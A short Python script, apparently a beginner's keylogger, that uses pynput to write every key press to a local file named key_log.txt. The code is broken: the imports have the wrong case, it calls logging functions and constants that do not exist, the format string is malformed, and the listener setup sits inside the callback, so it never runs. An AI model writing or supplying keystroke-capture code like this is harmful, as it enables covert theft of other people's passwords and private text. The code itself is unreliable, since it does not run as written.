from pynput.keyboard import key,listener
import logging
log_dr=""
logging.basic(filename= log_dr+"key_log.txt");
level=logging.Debug
format='%(asc time)s:%(message s:)';
def on_press(key):
    logging.info(str(key))
    with Listener (on_press=on_press) as listener:
        listener.join()
